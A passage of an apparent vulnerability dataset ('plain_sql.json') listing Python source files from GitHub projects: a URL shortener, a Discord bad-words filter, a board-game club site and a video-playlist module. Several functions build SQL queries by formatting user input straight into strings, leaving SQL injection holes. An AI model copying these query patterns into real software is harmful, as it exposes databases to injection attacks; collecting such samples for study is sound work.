playlist_id=playlist_id))\n\n\ndef create_video(playlist_id, title, thumbnail, position, db):\n    db.execute(\n        \"INSERT INTO video (playlist_id, title, thumbnail, position) VALUES({playlist_id}, '{title}', '{thumbnail}', {position});\".format(\n            playlist_id=playlist_id, title=title, thumbnail=thumbnail, position=position))\n\n\ndef update_video_positions(removed_position, db):\n    db.execute(\"UPDATE video SET position = position - 1 WHERE position > {removed_position}\".format(\n        removed_position=removed_position))\n\n\ndef update_video_position(id, position, next_position, db):\n    db.execute(\"UPDATE video SET position = Case position When {position} Then {next_position} Else position + 1 End WHERE position BETWEEN {next_position} AND {position};\".format(\n        position=position, next_position=next_position))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/PadamSethia/shorty/blob/bc7180a2a3784d796394b107278dfa32a75c8cf6",
        "file_path": "/app.py",
        "source": "#!/usr/bin/env python2.7\n\nimport sys\nimport os\n\n# Flask Import\nfrom flask import Flask , request , redirect , render_template , url_for \nfrom flask import jsonify , abort , make_response \nimport MySQLdb\n\n# Toekn and URL check import\nfrom check_encode import random_token , url_check\nfrom display_list import list_data\n\nfrom sql_table import mysql_table\n\n# Config import\nimport config\n\n# Import Loggers\nimport logging\nfrom logging.handlers import RotatingFileHandler\nfrom time import strftime\nimport traceback\n\n# Setting UTF-8 encoding\n\nreload(sys)\nsys.setdefaultencoding('UTF-8')\nos.putenv('LANG', 'en_US.UTF-8')\nos.putenv('LC_ALL', 'en_US.UTF-8')\n\napp = Flask(__name__)\napp.config.from_object('config')\n\nshorty_host = config.domain\n\n# MySQL configurations\n\nhost = config.host\nuser = config.user\npasswrd = config.passwrd\ndb = config.db\n\n@app.route('/analytics/<short_url>')\ndef analytics(short_url):\n\n\tinfo_fetch , counter_fetch , browser_fetch , platform_fetch = list_data(short_url)\n\treturn render_template(\"data.html\" , host = shorty_host,info = info_fetch ,counter = counter_fetch ,\\\n\t browser = browser_fetch , platform = platform_fetch)\n\n\n@app.route('/' , methods=['GET' , 'POST'])\ndef index():\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\t\n\t# Return the full table to displat on index.\n\tlist_sql = \"SELECT * FROM WEB_URL;\"\n\tcursor.execute(list_sql)\n\tresult_all_fetch = cursor.fetchall()\n\n\t\t\n\tif request.method == 'POST':\n\t\tog_url = request.form.get('url_input')\n\t\tcustom_suff = request.form.get('url_custom')\n\t\ttag_url = request.form.get('url_tag')\n\t\tif custom_suff == '':\n\t\t\ttoken_string =  random_token()\n\t\telse:\n\t\t\ttoken_string = custom_suff\n\t\tif og_url != '':\n\t\t\tif url_check(og_url) == True:\n\t\t\t\t\n\t\t\t\t# Check's for existing suffix \n\t\t\t\tcheck_row = \"SELECT S_URL FROM WEB_URL WHERE S_URL = %s FOR UPDATE\"\n\t\t\t\tcursor.execute(check_row,(token_string,))\n\t\t\t\tcheck_fetch = cursor.fetchone()\n\n\t\t\t\tif (check_fetch is None):\n\t\t\t\t\tinsert_row = \"\"\"\n\t\t\t\t\t\tINSERT INTO WEB_URL(URL , S_URL , TAG) VALUES( %s, %s , %s)\n\t\t\t\t\t\t\"\"\"\n\t\t\t\t\tresult_cur = cursor.execute(insert_row ,(og_url , token_string , tag_url,))\n\t\t\t\t\tconn.commit()\n\t\t\t\t\tconn.close()\n\t\t\t\t\te = ''\n\t\t\t\t\treturn render_template('index.html' ,shorty_url = shorty_host+token_string , error = e )\n\t\t\t\telse:\n\t\t\t\t\te = \"The Custom suffix already exists . Please use another suffix or leave it blank for random suffix.\"\n\t\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\t\t\telse:\n\t\t\t\te = \"URL entered doesn't seem valid , Enter a valid URL.\"\n\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\n\t\telse:\n\t\t\te = \"Enter a URL.\"\n\t\t\treturn render_template('index.html' , table = result_all_fetch, host = shorty_host,error = e)\n\telse:\t\n\t\te = ''\n\t\treturn render_template('index.html',table = result_all_fetch ,host = shorty_host, error = e )\n\t\n# Rerouting funciton\t\n\n@app.route('/<short_url>')\ndef reroute(short_url):\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\tplatform = request.user_agent.platform\n\tbrowser =  request.user_agent.browser\n\tcounter = 1\n\n\t# Platform , Browser vars\n\t\n\tbrowser_dict = {'firefox': 0 , 'chrome':0 , 'safari':0 , 'other':0}\n\tplatform_dict = {'windows':0 , 'iphone':0 , 'android':0 , 'linux':0 , 'macos':0 , 'other':0}\n\n\t# Analytics\n\tif browser in browser_dict:\n\t\tbrowser_dict[browser] += 1\n\telse:\t\t\t\t\t\t\t\t\n\t\tbrowser_dict['other'] += 1\n\t\n\tif platform in platform_dict.iterkeys():\n\t\tplatform_dict[platform] += 1\n\telse:\n\t\tplatform_dict['other'] += 1\n\t\t\t\n\tcursor.execute(\"SELECT URL FROM WEB_URL WHERE S_URL = %s;\" ,(short_url,) )\n\n\ttry:\n\t\tnew_url = cursor.fetchone()[0]\n\t\tprint new_url\n\t\t# Update Counters \n\t\t\n\t\tcounter_sql = \"\\\n\t\t\t\tUPDATE {tn} SET COUNTER = COUNTER + {og_counter} , CHROME = CHROME + {og_chrome} , FIREFOX = FIREFOX+{og_firefox} ,\\\n\t\t\t\tSAFARI = SAFARI+{og_safari} , OTHER_BROWSER =OTHER_BROWSER+ {og_oth_brow} , ANDROID = ANDROID +{og_andr} , IOS = IOS +{og_ios},\\\n\t\t\t\tWINDOWS = WINDOWS+{og_windows} , LINUX = LINUX+{og_linux}  , MAC =MAC+ {og_mac} , OTHER_PLATFORM =OTHER_PLATFORM+ {og_plat_other} WHERE S_URL = '{surl}';\".\\\n\t\t\t\tformat(tn = \"WEB_URL\" , og_counter = counter , og_chrome = browser_dict['chrome'] , og_firefox = browser_dict['firefox'],\\\n\t\t\t\tog_safari = browser_dict['safari'] , og_oth_brow = browser_dict['other'] , og_andr = platform_dict['android'] , og_ios = platform_dict['iphone'] ,\\\n\t\t\t\tog_windows = platform_dict['windows'] , og_linux = platform_dict['linux'] , og_mac = platform_dict['macos'] , og_plat_other = platform_dict['other'] ,\\\n\t\t\t\tsurl = short_url)\n\t\tres_update = cursor.execute(counter_sql)\n\t\tconn.commit()\n\t\tconn.close()\n\n\t\treturn redirect(new_url)\n\n\texcept Exception as e:\n\t\te = \"Something went wrong.Please try again.\"\n\t\treturn render_template('404.html') ,404\n\n# Search results\n@app.route('/search' ,  methods=['GET' , 'POST'])\ndef search():\n\ts_tag = request.form.get('search_url')\n\tif s_tag == \"\":\n\t\treturn render_template('index.html', error = \"Please enter a search term\")\n\telse:\n\t\tconn = MySQLdb.connect(host , user , passwrd, db)\n\t\tcursor = conn.cursor()\n\t\t\n\t\tsearch_tag_sql = \"SELECT * FROM WEB_URL WHERE TAG = %s\" \n\t\tcursor.execute(search_tag_sql , (s_tag, ) )\n\t\tsearch_tag_fetch = cursor.fetchall()\n\t\tconn.close()\n\t\treturn render_template('search.html' , host = shorty_host , search_tag = s_tag , table = search_tag_fetch )\n\n\n@app.after_request\ndef after_request(response):\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s %s',timestamp , request.remote_addr , \\\n\t\t\t\trequest.method , request.scheme , request.full_path , response.status)\n\treturn response\n\n\n@app.errorhandler(Exception)\ndef exceptions(e):\n\ttb = traceback.format_exc()\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s 5xx INTERNAL SERVER ERROR\\n%s',\n        timestamp, request.remote_addr, request.method,\n        request.scheme, request.full_path, tb)\n\treturn make_response(e , 405)\n\nif __name__ == '__main__':\n\n\t# Logging handler\n\thandler = RotatingFileHandler('shorty.log' , maxBytes=100000 , backupCount = 3)\n\tlogger = logging.getLogger('tdm')\n\tlogger.setLevel(logging.ERROR)\n\tlogger.addHandler(handler)\n\tapp.run(host='127.0.0.1' , port=5000)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/QiLinXue/discord-cyberbullying/blob/84452c231c1b6878af10409c9a787c5fa196dc49",
        "file_path": "/server/functions/badWords.py",
        "source": "import mysql.connector\n\nclass BadWordsDB():\n    from serverSetup import DBUSER,DBPASS\n\n    def __init__(self,host,user,passwd,database,filterList=[]):\n        self.host= host\n        self.user = user\n        self.passwd = passwd\n        self.database = database\n        self.filterList = filterList\n\n    def connect(self):\n        self.mydb = mysql.connector.connect(\n            host=self.host,\n            user=self.user,\n            passwd=self.passwd,\n            database=self.database\n        )\n        self.cursor = self.mydb.cursor()\n\n    def close(self):\n        self.cursor.close()\n        self.mydb.close()\n\n    def fetch(self):\n        self.connect()\n\n        sqlFormula = \"SELECT * FROM badwords\"\n        self.cursor.execute(sqlFormula)\n        myresults = self.cursor.fetchall()\n\n        # Format everything\n        badWordArray = []\n        for row in myresults:\n            badWordArray.append(row[0])\n\n        self.close()\n\n        return badWordArray\n    \n    def insert(self,targetWord,badwordlist):\n        if not targetWord.lower() in badwordlist:\n            self.connect()\n\n            sqlFormula = \"INSERT INTO badwords (word, badness) VALUE (%s,%s)\"\n            word = (targetWord.lower(),1)\n\n            self.cursor.execute(sqlFormula, word)\n            self.close()\n    \n    def printAll(self):\n        baddies = self.fetch()\n        return ' '.join(baddies)\n\n    def delete(self,targetWord):\n        self.connect()\n\n        sqlFormula = \"DELETE FROM badwords WHERE word='%s'\" % targetWord\n\n        self.cursor.execute(sqlFormula)\n        self.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/michalpytlos/FSND_p4/blob/13d25b386e840bd1fe580627ed511f5be28aa037",
        "file_path": "/vagrant/4-project/boardgameclub/views.py",
        "source": "from flask import (render_template, url_for, request, redirect, session, abort,\n                   make_response, jsonify, flash)\nimport sqlalchemy\nimport sqlalchemy.orm.exc\nimport requests\nfrom xml.etree import ElementTree\nimport json\nimport time\nimport string\nimport random\nfrom decimal import Decimal\nfrom oauth2client import client\nfrom boardgameclub import app\nfrom boardgameclub.database import db_session\nfrom boardgameclub.models import (Club, Game, Post,  User, GameCategory,\n                                  ClubAdmin, clubs_games_assoc,\n                                  users_games_assoc)\n\n\n###################\n# Csrf protection #\n###################\n\n# Implemented as per:\n# http://flask.pocoo.org/snippets/3/' posted by Dan Jacob on 2010-05-03\n# but with only one token per session.\n\n@app.before_request\ndef csrf_protect():\n    \"\"\"Abort create, update and delete requests without correct csrf tokens.\"\"\"\n    if request.method in ('POST', 'PATCH', 'DELETE'):\n        print 'validating csrf token'\n        token = session.get('_csrf_token')\n        token_from_json = request.get_json().get(\n            '_csrf_token') if request.get_json() else None\n        if (\n            not token or\n            token not in (request.form.get('_csrf_token'), token_from_json)\n        ):\n            print 'failed csrf token test'\n            abort(403)\n        else:\n            print 'csrf token ok'\n\n\ndef generate_csrf_token():\n    \"\"\"Add csrf token to the session and return the csrf token.\"\"\"\n    if '_csrf_token' not in session:\n        print 'generating csrf token'\n        session['_csrf_token'] = random_string()\n    return session['_csrf_token']\n\n\ndef random_string():\n    \"\"\"Create a random string.\"\"\"\n    chars = string.ascii_letters + string.digits\n    return ''.join([chars[random.randint(0, 61)] for i in range(20)])\n\n\napp.jinja_env.globals['csrf_token'] = generate_csrf_token\n\n\n###############################\n# Database session management #\n###############################\n\n@app.teardown_appcontext\ndef remove_session(exception=None):\n    \"\"\"Remove database session at the end of each request.\"\"\"\n    db_session.remove()\n\n\n####################################\n# Authentication and authorisation #\n####################################\n\n@app.before_request\ndef ownership_required():\n    \"\"\"Prevent access to update and delete endpoints by\n    non-authorized users.\n    \"\"\"\n    if (\n        request.endpoint in ('profile_game_add', 'club_game_add') or\n        request.method in ('PATCH', 'DELETE')\n    ):\n        print 'checking ownership'\n        if 'user_id' not in session or not check_ownership():\n            abort(403)\n        else:\n            print 'ownership ok'\n\n\ndef check_ownership():\n    \"\"\"Verify if the user is the owner of the requested resource.\"\"\"\n    user_id = session.get('user_id')\n    if not user_id:\n        return False\n    elif 'club_' in request.endpoint or 'home' in request.endpoint:\n        admin = ClubAdmin.query.filter_by(user_id=user_id).scalar()\n        return True if admin else False\n    elif 'profile_' in request.endpoint:\n        return request.view_args['user_id'] == user_id\n    elif request.endpoint == 'post_':\n        owned_post = Post.query.filter_by(\n            id=request.view_args['post_id'], user_id=user_id).scalar()\n        return True if owned_post else False\n    else:\n        print 'Unable to verify ownership'\n        return False\n\n\n@app.before_request\ndef login_required():\n    \"\"\"Prevent access to create endpoints by non-authenticated users.\"\"\"\n    if (\n        (request.endpoint in ('post_add', 'profile_add', 'g_disconnect') or\n         request.endpoint == 'game_' and request.method == 'POST') and\n        'username' not in session\n    ):\n        abort(401)\n\n\ndef validate_id_token(token, token_jwt):\n    \"\"\"Validate id_token as per\n    https://developers.google.com/identity/protocols/OpenIDConnect.\n    \"\"\"\n    url = 'https://www.googleapis.com/oauth2/v3/tokeninfo'\n    params = 'id_token={}'.format(token_jwt)\n    r = requests.get(url, params=params)\n\n    if (\n        # Is the token properly signed by the issuer?\n        r.status_code == 200 and r.json()['aud'] == token['aud'] and\n        # Was it issued by google?\n        token['iss'] in ('https://accounts.google.com',\n                         'accounts.google.com') and\n        # Is it intended for this app?\n        token['aud'] == app.config['CLIENT_ID'] and\n        # Is it still valid (not expired)?\n        token['exp'] > int(time.time())\n    ):\n        return True\n\n\n##################################################\n# Miscellaneous functions used by view functions #\n##################################################\n\ndef json_response(body, code):\n    \"\"\"Build a JSON response.\"\"\"\n    j_response = make_response(json.dumps(body), code)\n    j_response.headers['Content-Type'] = 'application/json'\n    return j_response\n\n\ndef error_response(err_msg, code):\n    \"\"\"Build a one-line JSON error response.\"\"\"\n    err_response = make_response(json.dumps({\"error-msg\": err_msg}), code)\n    err_response.headers['Content-Type'] = 'application/json'\n    return err_response\n\n\ndef bgg_game_options(bg_name):\n    \"\"\"Search for games on bgg API by name and return all the matching options.\n\n    Args:\n        bg_name (str): game name.\n\n    Returns:\n        List of dictionaries. Each dictionary holds basic info about a game.\n    \"\"\"\n    bgg_games = []\n    url = 'https://boardgamegeek.com/xmlapi2/search'\n    payload = {'query': bg_name, 'type': 'boardgame'}\n    r = requests.get(url, params=payload)\n    print r.url\n    # Parse the xml response\n    root = ElementTree.fromstring(r.content)\n    for item in root.findall('item'):\n        bgg_id = item.get('id')\n        game_name = item.find('name').get('value')\n        try:\n            year = item.find('yearpublished').get('value')\n        except AttributeError:\n            year = ''\n        bgg_games.append({'id': bgg_id, 'name': game_name, 'year': year})\n    return bgg_games\n\n\ndef bgg_game_info(bgg_id):\n    \"\"\"Get game info from bgg API; return dictionary with game info and\n    list of game category objects .\n    \"\"\"\n    game_info = {'bgg_id': bgg_id}\n    url = 'https://www.boardgamegeek.com/xmlapi2/thing'\n    payload = {'id': bgg_id, 'stats': 1}\n    r = requests.get(url, params=payload)\n    # Parse the xml response\n    root = ElementTree.fromstring(r.content)[0]\n    # name\n    for name in root.findall('name'):\n        if name.get('type') == 'primary':\n            game_info['name'] = name.get('value')\n    # image\n    game_info['image'] = root.find('image').text\n    # complexity/weight\n    game_info['weight'] = root.find('statistics').find('ratings').find(\n        'averageweight').get('value')\n    # bgg_rating\n    game_info['bgg_rating'] = root.find('statistics').find('ratings').find(\n        'average').get('value')\n    # other properties\n    properties = ['year_published', 'min_age', 'min_playtime', 'max_playtime',\n                  'min_players', 'max_players']\n    for bg_prop in properties:\n        game_info[bg_prop] = root.find(bg_prop.replace('_', '')).get('value')\n\n    game_info['bgg_link'] = 'https://boardgamegeek.com/boardgame/{}'.format(\n        bgg_id)\n    # categories\n    categories = []\n    for link in root.findall('link'):\n        if link.get('type') == 'boardgamecategory':\n            categories.append(check_game_category(link.get('value')))\n    return game_info, categories\n\n\ndef check_user(email, name, picture):\n    \"\"\"Check if the user is already in the database;\n    if not, make a new entry. Return user's id.\n    \"\"\"\n    user = User.query.filter_by(email=email).scalar()\n    new_user = False\n    if not user:\n        print 'adding new user to the db'\n        user = User(email=email, name=name, picture=picture)\n        db_session.add(user)\n        db_session.commit()\n        user = User.query.filter_by(email=email).scalar()\n        new_user = True\n    else:\n        print 'user already exists'\n    return user.id, new_user\n\n\ndef check_game_category(category_name):\n    \"\"\"Check if the game category is already in the database;\n    if not, make a new entry. Return the category.\n    \"\"\"\n    category = GameCategory.query.filter_by(name=category_name).scalar()\n    if not category:\n        new_category = GameCategory(name=category_name)\n        db_session.add(new_category)\n        db_session.commit()\n        category = GameCategory.query.filter_by(name=category_name).scalar()\n    return category\n\n\ndef check_game(bgg_id):\n    \"\"\"Check if the game is already in the database;\n    if not, make a new entry. Return the game.\n    \"\"\"\n    bgame = Game.query.filter_by(bgg_id=bgg_id).scalar()\n    if not bgame:\n        # Get the game info from bgg API\n        game_info, bgg_categories = bgg_game_info(bgg_id)\n        # Add the game to the database\n        bgame = Game(**game_info)\n        bgame.categories = bgg_categories\n        db_session.add(bgame)\n        db_session.commit()\n        print 'Game added to the database!'\n    else:\n        print 'Game already in the database'\n    return bgame\n\n\ndef make_posts_read(posts):\n    \"\"\"Prepare data on a set of posts for the template engine.\n\n    Args:\n        posts (list): list of Post objects.\n\n    Returns:\n         List of dictionaries. Each dictionary holds all the post data\n         required by the template engine.\n    \"\"\"\n    posts_read = []\n    user_id = session.get('user_id')\n    for post in posts:\n        user = post.author\n        post_dict = {\n            'id': post.id,\n            'subject': post.subject,\n            'body': post.body,\n            'author': user.name,\n            'author_picture': user.picture,\n            'posted': time.strftime(\"%d/%m/%Y, %H:%M\",\n                                    time.gmtime(post.posted)),\n            'owner': post.user_id == user_id\n        }\n        if post.edited:\n            post_dict['edited'] = time.strftime(\"%d/%m/%Y, %H:%M\",\n                                                time.gmtime(post.edited))\n        posts_read.append(post_dict)\n    return posts_read\n\n\ndef game_query_builder(key, value, query):\n    \"\"\"Modify textual sql query in order take into account an additional\n    WHERE condition.\n\n    Args:\n        key (str): condition name.\n        value (str): condition value.\n        query (str): SQL query.\n\n    Returns:\n        str: modified SQL query.\n    \"\"\"\n    d = {'id': \"id in ({value})\",\n         'name': \"name LIKE '{value}%'\",\n         'rating-min': 'bgg_rating>={value}',\n         'players-from': 'min_players<={value}',\n         'players-to': 'max_players>={value}',\n         'time-from': 'max_playtime>={value}',\n         'time-to': 'min_playtime<={value}',\n         'weight-min': 'weight>={value}',\n         'weight-max': 'weight<={value}',\n         }\n    if len(value) == 0 or value == 'any' or not d.get(key):\n        # do nothing\n        return query\n    elif key == 'id' and 'id in' in query:\n        pos = query.find(')', query.find('id in'))\n        return query[:pos] + ', ' + value + query[pos:]\n    else:\n        return query + d[key].format(value=value) + ' AND '\n\n\ndef clear_games(*games):\n    \"\"\"Remove orphaned games from the database.\n\n    If any of the games is not owned by any user or the club,\n    remove it from the database.\n    \"\"\"\n    for game in games:\n        if len(game.users) == 0 and len(game.clubs) == 0:\n            categories = game.categories\n            db_session.delete(game)\n            db_session.commit()\n            clear_categories(*categories)\n\n\ndef clear_categories(*categories):\n    \"\"\"Remove orphaned game categories from the database\"\"\"\n    for category in categories:\n        if len(category.games) == 0:\n            db_session.delete(category)\n            db_session.commit()\n\n\ndef patch_resource(attributes, my_obj):\n    \"\"\"Patch database resource.\n\n    Args:\n        attributes (list): list of dictionaries;\n            each dictionary is in the following format:\n            {'name': attr_name, 'value': attr_value}.\n        my_obj: instance of any of the models classes.\n    \"\"\"\n    for attribute in attributes:\n        setattr(my_obj, attribute['name'], attribute['value'])\n    db_session.add(my_obj)\n    db_session.commit()\n\n\ndef validate_api_game_query(query_dict):\n    \"\"\"Validate keys and values of the query.\n\n    Args:\n        query_dict (dict): dictionary where each key:value pair\n            represents condition-name:condition-value pair of\n            an SQL WHERE condition.\n\n    Returns:\n        bool: True if all keys and values are valid, False otherwise.\n    \"\"\"\n    args_int = ['club', 'user', 'id', 'category', 'rating-min', 'players-from',\n                'players-to', 'time-from', 'time-to', 'weight-min',\n                'weight-max']\n    args_other = ['name']\n    args_dupl = ['user', 'id', 'category']\n    for key, value in query_dict.iteritems(multi=True):\n        if(\n            # Check if any of the keys is invalid\n            key not in args_int + args_other or\n            # Check if any of the values is invalid\n            key in args_int and not value.isdigit()\n        ):\n            return False\n    # Check if there are any non-allowed key duplicates\n    for key, values in query_dict.iterlists():\n        if key not in args_dupl and len(values) > 1:\n            return False\n    # Validate players-to and players-from\n    players = ['players-from', 'players-to']\n    if not(\n        # None of the two keys is present\n        not any([x in query_dict for x in players]) or\n        # Both keys are present and ...\n        all([x in query_dict for x in players]) and\n        # ... their values are valid\n        int(query_dict['players-to']) >= int(query_dict['players-from'])\n    ):\n        return False\n    return True\n\n\ndef dicts_purge(p_dicts, *keep_keys):\n    \"\"\"Purge dictionaries of unwanted key:value pairs.\n\n    Args:\n        p_dicts (list): list of dicts to be purged.\n        *keep_keys: list of keys to be kept.\n\n    Returns:\n        List of purged dicts.\n    \"\"\"\n    for p_dict in p_dicts:\n        for key in p_dict.keys():\n            if key not in keep_keys:\n                del p_dict[key]\n    return p_dicts\n\n\ndef sql_to_dicts(*games):\n    \"\"\"Convert Game objects to dictionaries.\n\n    Each column-name:value pair in an object is converted to a\n    key:value pair in the corresponding dictionary.\n\n    Args:\n        *games: list of Game objects.\n\n    Returns:\n        list of dictionaries.\n    \"\"\"\n    sql_dicts = []\n    for game in games:\n        keys = game.__table__.columns.keys()\n        values = [getattr(game, key) for key in keys]\n        values = [float(value) if type(value) == Decimal\n                  else value for value in values]\n        sql_dicts.append(dict(zip(keys, values)))\n    return sql_dicts\n\n\ndef sign_out():\n    \"\"\"Sign out a user.\"\"\"\n    try:\n        # Revoke access token if possible\n        r = requests.post(\n            'https://accounts.google.com/o/oauth2/revoke',\n            params={'token': session['access_token']},\n            headers={'content-type': 'application/x-www-form-urlencoded'})\n        if r.status_code != 200:\n            print 'Failed to revoke access token'\n            print r.text\n        # Delete user info from session\n        del session['email']\n        del session['username']\n        del session['access_token']\n        del session['user_id']\n        del session['_csrf_token']\n        print 'Signed out'\n    except KeyError:\n        print 'Not signed in'\n        abort(401)\n\n\n##################\n# View functions #\n##################\n\n@app.route('/')\ndef home():\n    \"\"\"Return the app's main page.\"\"\"\n    club = Club.query.filter_by(id=1).scalar()\n    members = User.query.all()\n    posts = Post.query.all()\n    posts_read = make_posts_read(posts)\n    return render_template('club.html', club=club, posts=posts_read,\n                           members=members, games=club.games,\n                           owner=check_ownership())\n\n\n@app.route('/club', methods=['PATCH'])\ndef club_():\n    \"\"\"Update the Club.\"\"\"\n    club = Club.query.filter_by(id=1).scalar()\n    attributes = request.get_json()['data']['attributes']\n    patch_resource(attributes, club)\n    flash('Club info updated!')\n    return '', 204\n\n\n@app.route('/club/games/add', methods=['GET', 'POST'])\ndef club_game_add():\n    \"\"\"Create ClubGame or return page with form to do so.\n\n    Use POST and GET methods respectively.\n    \"\"\"\n    if request.method == 'GET':\n        # Show the game options matching the specified name\n        bgg_options = bgg_game_options(request.args['name'])\n        return render_template('game-options.html', games=bgg_options)\n    else:\n        # Add the chosen game to the database\n        game = check_game(request.form['bgg-id'])\n        club = Club.query.filter_by(id=1).scalar()\n        club.games.append(game)\n        db_session.add(club)\n        db_session.commit()\n        flash('Game added to the collection!')\n        return redirect(url_for('home'))\n\n\n@app.route('/club/games/<int:game_id>', methods=['DELETE'])\ndef club_game_(game_id):\n    \"\"\"Delete ClubGame.\"\"\"\n    club = Club.query.filter_by(id=1).scalar()\n    try:\n        game = Game.query.filter_by(id=game_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    club.games.remove(game)\n    db_session.commit()\n    clear_games(game)\n    flash('Game removed from the collection!')\n    return '', 204\n\n\n@app.route('/posts/add', methods=['GET', 'POST'])\ndef post_add():\n    \"\"\"Create Post or return page with form to do so.\n\n    Use POST and GET methods respectively.\n    \"\"\"\n    if request.method == 'GET':\n        return render_template('post-new.html')\n    else:\n        # Add Post to the database\n        post_data = {\n            'user_id': session['user_id'],\n            'subject': request.form['subject'],\n            'body': request.form['body'],\n            'posted': int(time.time())\n        }\n        post = Post(**post_data)\n        db_session.add(post)\n        db_session.commit()\n        flash('Post created!')\n        return redirect(url_for('home'))\n\n\n@app.route('/posts/<int:post_id>', methods=['PATCH', 'DELETE'])\ndef post_(post_id):\n    \"\"\"Update or Delete Post.\n\n    Use PATCH and DELETE methods respectively.\n    \"\"\"\n    post = Post.query.filter_by(id=post_id).scalar()\n    if request.method == 'PATCH':\n        # Update Post\n        attributes = request.get_json()['data']['attributes']\n        attributes.append({'name': 'edited', 'value': int(time.time())})\n        patch_resource(attributes, post)\n        flash('Post edited!')\n        return '', 204\n    else:\n        # Delete Post\n        db_session.delete(post)\n        db_session.commit()\n        flash('Post deleted!')\n        return '', 204\n\n\n@app.route('/users/<int:user_id>/new')\ndef profile_add(user_id):\n    \"\"\"Return page with form letting the user update his/her new profile.\"\"\"\n    try:\n        user = User.query.filter_by(id=user_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    return render_template('profile-new.html', user=user)\n\n\n@app.route('/users/<int:user_id>', methods=['GET', 'PATCH', 'DELETE'])\ndef profile_(user_id):\n    \"\"\"Return user's profile page or Update Profile or Delete Profile.\n\n    Use GET, PATCH and DELETE methods respectively.\n    \"\"\"\n    try:\n        user = User.query.filter_by(id=user_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    if request.method == 'GET':\n        # Return user's profile page\n        return render_template('profile.html', user=user, games=user.games,\n                               owner=check_ownership())\n    elif request.method == 'PATCH':\n        # Update Profile\n        attributes = request.get_json()['data']['attributes']\n        patch_resource(attributes, user)\n        flash('Profile updated!')\n        return '', 204\n    else:\n        # Delete Profile\n        games = user.games\n        db_session.delete(user)\n        db_session.commit()\n        clear_games(*games)\n        sign_out()\n        flash('Profile deleted!')\n        return '', 204\n\n\n@app.route('/users/<int:user_id>/games/add', methods=['GET', 'POST'])\ndef profile_game_add(user_id):\n    \"\"\"Create UserGame or return page with form to do so.\n\n    Use POST and GET methods respectively.\n    \"\"\"\n    if request.method == 'GET':\n        # Show the game options matching the specified name\n        bgg_options = bgg_game_options(request.args['name'])\n        return render_template('game-options.html', games=bgg_options)\n    else:\n        # Add the chosen game to the database\n        game = check_game(request.form['bgg-id'])\n        user = User.query.filter_by(id=user_id).scalar()\n        user.games.append(game)\n        db_session.add(user)\n        db_session.commit()\n        flash('Game added to the collection!')\n        return redirect(url_for('profile_', user_id=user_id))\n\n\n@app.route('/users/<int:user_id>/games/<int:game_id>', methods=['DELETE'])\ndef profile_game_(user_id, game_id):\n    \"\"\"Delete UserGame.\"\"\"\n    try:\n        user = User.query.filter_by(id=user_id).one()\n        game = Game.query.filter_by(id=game_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    user.games.remove(game)\n    db_session.commit()\n    clear_games(game)\n    flash('Game removed from the collection!')\n    return '', 204\n\n\n@app.route('/games/<int:game_id>', methods=['GET', 'POST'])\ndef game_(game_id):\n    \"\"\"Return game page or Update Game.\n\n    Use GET and POST methods respectively.\n    \"\"\"\n    try:\n        bgame = Game.query.filter_by(id=game_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    if request.method == 'GET':\n        # Return game page\n        return render_template('game.html', game=bgame)\n    else:\n        # Update game info from bgg API\n        game_info, bgg_categories = bgg_game_info(bgame.bgg_id)\n        for key, value in game_info.iteritems():\n            setattr(bgame, key, value)\n        bgame.categories = bgg_categories\n        db_session.commit()\n        flash('Game info updated!')\n        return redirect(url_for('game_', game_id=game_id))\n\n\n@app.route('/games/search')\ndef game_finder():\n    \"\"\"Return game-finder page.\"\"\"\n    all_categories = GameCategory.query.all()\n    games = []\n    if len(request.args) > 0:\n        # Build SQL query\n        query = ''\n        for key, value in request.args.iteritems():\n            query = game_query_builder(key, value, query)\n        query = query[:-5]\n        print query\n        # Get games satisfying the search criteria\n        game_category = int(request.args['category'])\n        if game_category == 0:\n            games = Game.query.filter(sqlalchemy.text(query)).all()\n        else:\n            # Consider game category\n            games = (Game.query.filter(sqlalchemy.text(query)).filter(\n                Game.categories.any(GameCategory.id == game_category)).all())\n    return render_template('game-finder.html', games=games,\n                           all_categories=all_categories)\n\n\n@app.route('/api/games')\ndef api_games():\n    \"\"\"Return list of games, with all their attributes, satisfying\n    the criteria provided in the request query string.\n\n    Valid query args are of two types: ownership type and game-attribute type.\n    The function first builds two sets of games, ownership set with\n    games satisfying the ownership criteria and game-attribute set with\n    games satisfying the game-attribute criteria; an intersection of\n    these two sets is then returned to the user. Specifying no criteria\n    of a given type will result in the corresponding set with all\n    the games in the database.\n\n    Valid arguments are as follows:\n        ownership type:\n            club=1: include all games owned by the club\n            user=INTEGER: include all games owned by the user,\n                value denotes user id,\n                multiple args=YES\n        game-attribute type:\n            id=INTEGER: value denotes game id,\n                multiple args=YES\n            name=NAME\n            category=INTEGER: value denotes category id,\n                multiple args=YES\n            rating-min=[1-10]\n            players-from=INTEGER: query must also include players-to\n            players-to=INTEGER: query must also include players-from\n            time-from=INTEGER\n            time-to=INTEGER\n            weight-min=[1-5]\n            weight-max=[1-5]\n\n    The response is in JSON.\n    \"\"\"\n    if not validate_api_game_query(request.args):\n        return error_response(\n            'One or more query parameters have invalid key and/or value', 400)\n    # Club filter\n    games_club = []\n    if request.args.get('club') == '1':\n        games_club = db_session.query(clubs_games_assoc).all()\n        games_club = [club_game.game_id for club_game in games_club]\n    print 'games_club', games_club\n    # User filter\n    users = [int(user_id) for user_id in request.args.getlist('user')]\n    games_users = db_session.query(users_games_assoc).filter(\n        users_games_assoc.c.user_id.in_(users)).all()\n    games_users = [game.game_id for game in 